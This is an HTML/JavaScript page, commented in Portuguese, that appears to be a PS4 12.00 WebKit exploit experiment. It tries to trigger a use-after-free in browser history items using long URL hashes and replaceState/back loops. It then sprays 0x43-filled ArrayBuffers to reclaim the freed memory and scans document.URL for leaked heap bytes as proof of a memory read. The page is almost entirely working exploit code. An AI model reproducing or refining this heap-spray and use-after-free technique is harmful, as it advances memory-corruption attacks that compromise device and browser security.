
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Fingerprint Strategy</title>
<style>
    body { background-color: #101010; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
    button { 
        padding: 15px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 1px solid #0f0; background: #002200; color: #fff;
    }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll; background: #000; }
    .leak { color: #ff00ff; font-weight: bold; border: 1px solid #ff00ff; padding: 5px; }
    .ghost { color: #ffff00; font-weight: bold; border: 1px solid #ffff00; padding: 5px; }
</style>
</head>
<body>
<h2>PS4 WebKit - V8 Fingerprinting</h2>
<div id="status">Estratégia: Windowed Read + Ghosts</div>
<button onclick="runFingerprint()">INICIAR DIAGNÓSTICO (LOOP 48)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m, type="") { 
    const d = document.createElement("div");
    d.innerHTML = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    if(type) d.className = type;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// === PASSO A: DEFINIÇÃO DE PADRÕES ===
// Criamos strings gigantes conhecidas para "sujar" o heap antes do ataque
const PATTERN_A = "A".repeat(1000); // Fantasma 1
const PATTERN_B = "B".repeat(1000); // O estado atual
const SPRAY_C   = 0x43434343;       // O que vamos tentar injetar (C)

var keepAlive = [];

async function runFingerprint() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando Fingerprints...";

    // 1. Configurar Histórico com Fantasmas
    log("1. Criando histórico (A -> B)...");
    
    // Estado Base (A)
    history.pushState("STATE_A", "", "#" + PATTERN_A);
    
    // Estado Atual (B) - É aqui que o UAF vai ocorrer
    history.pushState("STATE_B", "", "#" + PATTERN_B);
    
    // 2. Loop UAF (Limite 48)
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        // Manipulação de hash para estressar o HistoryItem
        let frag = "V".repeat(size); 
        
        // Substitui o estado atual constantemente
        history.replaceState({}, "", "#" + frag);
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            log(">>> JANELA CRÍTICA (48) <<<");
            
            // Tenta liberar o item B
            setTimeout(() => history.back(), 0);
            
            // Spray de "C" (Tentativa de ocupar o lugar do B)
            // Se funcionar, a URL vai virar C.
            // Se falhar parcialmente, pode mostrar A (o anterior) ou Lixo.
            doSprayC();
            
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(500); // Espera estabilizar
    
    // === PASSO B: WINDOWED READ ===
    // Leitura segura sem travar
    performWindowedRead();
}

function doSprayC() {
    // Aloca buffers cheios de 'C' (0x43)
    // Tamanho 64 bytes (Seu sucesso anterior)
    for(let k=0; k<1000; k++) {
        let buf = new ArrayBuffer(64);
        let view = new Uint32Array(buf);
        view.fill(SPRAY_C);
        keepAlive.push(buf);
    }
}

function performWindowedRead() {
    log("3. Analisando URL (Modo Seguro)...");
    
    try {
        let url = document.URL;
        let len = url.length;
        
        log(`Tamanho Relatado: ${len}`);
        
        // Pontos de verificação estratégicos
        let checkPoints = [0, 100, 1000, 5000, 10000];
        let foundAnomaly = false;
        
        // Amostragem
        let sample = "";
        
        // Varre apenas os primeiros 2000 chars de forma segura
        for(let i=0; i < Math.min(len, 2000); i++) {
            let code = url.charCodeAt(i);
            let char = url.charAt(i);
            
            // Filtra o cabeçalho "http..."
            if (i > 50) {
                // Checa por Fantasma A (Deveria ter sumido)
                if (char === 'A') {
                    log(`ALERTA: Fantasma 'A' encontrado no index ${i}!`, "ghost");
                    foundAnomaly = true;
                }
                
                // Checa por Injeção C (Nosso spray)
                if (code === 0x43 || char === 'C') {
                    log(`SUCESSO: Injeção 'C' encontrada no index ${i}!`, "leak");
                    foundAnomaly = true;
                }
                
                // Checa por Lixo (Caracteres não imprimíveis ou estranhos)
                // V (0x56) é o esperado. Qualquer coisa diferente é anomalia.
                if (code !== 0x56 && code !== 0x41 && code !== 0x43 && code !== 0x23) {
                     // Ignora # (0x23)
                     sample += `[${code.toString(16)}] `;
                }
            }
        }
        
        if (sample.length > 0) {
            log("LEAK DE MEMÓRIA (Raw Bytes):");
            log(sample, "leak");
            log("Isso confirma leitura de memória arbitrária (Heap Dump).");
        } else if (!foundAnomaly) {
            log("Resultado: Apenas 'V' encontrado (Limpo).");
            log("A memória foi corrigida antes da leitura.");
        }
        
        // === PASSO C: CONTROLE DE LAYOUT ===
        // Tenta mudar o hash para ver se quebra o layout
        log("4. Teste de Layout (Hash Swap)...");
        let oldLen = document.URL.length;
        location.hash = "#TEST";
        let newLen = document.URL.length;
        
        log(`Comp: ${oldLen} -> ${newLen}`);
        if (Math.abs(oldLen - newLen) > 1000) {
            log("ANOMALIA DE LAYOUT DETECTADA!", "leak");
            log("O tamanho mudou drasticamente. Ponteiro corrompido confirmada.");
        }

    } catch(e) {
        log("Erro de Leitura (Isso é bom!): " + e.message);
        log("Significa que acessamos memória inválida sem crashar o console inteiro.");
    }
}
</script>
</body>
</html>
